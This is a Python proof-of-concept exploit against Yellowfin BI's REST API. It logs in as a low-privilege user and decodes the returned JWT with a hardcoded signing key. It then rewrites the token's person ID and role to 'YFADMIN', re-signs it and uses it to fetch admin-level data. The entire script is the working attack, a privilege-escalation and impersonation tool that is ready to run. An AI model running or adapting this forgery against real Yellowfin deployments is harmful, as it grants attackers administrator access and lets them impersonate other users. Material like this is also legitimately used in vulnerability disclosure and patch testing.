import jwt, json
import requests, sys
import time, datetime

yf_base_url = sys.argv[1]
email = sys.argv[2]
password = sys.argv[3]
UUID = sys.argv[4]

key = """q0x3DBLMJyteqkbUIx+7NzotD1K46kvfj7TW7i2ID4lBFyB9wse3cRw0buRrfKjzEuw5VySDrDsG\neyAPUukScQ=="""

def get_refresh_token(username,password):
    millis = int(round(time.time() * 1000))

    headers = {
        "Authorization": f"YELLOWFIN ts={millis}, nonce=random",
        "Content-Type": "application/json",
        "Accept": "application/vnd.yellowfin.api-v1+json",
    }

    payload = json.dumps(
        {
            "userName": username,
            "password": password,
            "clientOrgRef": "default_org",
        }
    )

    refresh_token_url = f"{yf_base_url}/api/refresh-tokens"

    r = requests.request("POST", url=refresh_token_url, headers=headers, data=payload)
    r_dict = json.loads(r.text)
    return r_dict["securityToken"]

def get_access_token(refresh_token):
    ACCESS_TOKEN_URL = f"{yf_base_url}/api/access-tokens"

    millis = int(round(time.time() * 1000))
    headers = {
        "Accept": "application/vnd.yellowfin.api-v1+json",
        "Authorization": f"YELLOWFIN ts={millis}, nonce=random, token={refresh_token}",
        "Content-Type": "application/json",
    }

    r = requests.post(url=ACCESS_TOKEN_URL, headers=headers)
    r_dict = json.loads(r.text)
    return r_dict["securityToken"]

def get_roles(token):
    ROLES_URL = f"{yf_base_url}/api/roles"

    millis = int(round(time.time() * 1000))
    headers = {
        "Accept": "application/vnd.yellowfin.api-v1+json",
        "Authorization": f"YELLOWFIN ts={millis}, nonce=random, token={token}",
        "Content-Type": "application/json",
    }

    r = requests.get(url=ROLES_URL, headers=headers)
    return r.text

if __name__ == '__main__':
    testyRTok = get_refresh_token(email,password)
    testyATok = get_access_token(testyRTok)
    print("LOG: GOT TOKEN ONE")
    print(f"LOG: Roles For LOW PRIV USER: {get_roles(testyATok)}")
    testyATok = jwt.decode(testyATok,key,algorithms=["HS256"])
    print("LOG: Forging New Token")
    testyATok["person"] = UUID
    testyATok["role"] = "YFADMIN"
    print(f"LOG: Attempting To Login As User ID: {UUID}")
    adminATok = jwt.encode(testyATok, key, algorithm="HS256")
    print(f"LOG: Roles For ADMIN: {get_roles(adminATok)}")